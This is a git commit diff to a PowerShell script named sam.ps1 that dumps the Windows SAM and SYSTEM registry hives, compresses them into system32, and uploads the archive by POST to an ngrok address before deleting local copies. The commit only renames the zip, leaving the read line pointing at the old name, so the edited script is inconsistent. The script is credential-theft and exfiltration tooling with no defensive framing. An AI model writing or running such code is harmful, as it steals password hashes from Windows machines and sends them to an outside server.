730083a9ce578d3c2113095d9c5827a7a4aa557b
Lex <104235290+VBV11@users.noreply.github.com>
2026-07-02 16:21:30 +0200

    Change zip file name from dump.zip to hives.zip

--- sam.ps1
+++ sam.ps1
@@ -1,6 +1,6 @@
 reg save hklm\sam sam;
 reg save hklm\system sys;
-Compress-Archive -Path "$PWD\sys", "$PWD\sam" -DestinationPath "C:\WINDOWS\system32\dump.zip" -Force;
+Compress-Archive -Path "$PWD\sys", "$PWD\sam" -DestinationPath "C:\WINDOWS\system32\hives.zip" -Force;
 $file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\dump.zip");
 iwr "https://monorail-moonlike-afoot.ngrok-free.dev/" -Method POST -Body $file -UseBasicParsing;
 remove-item sys;
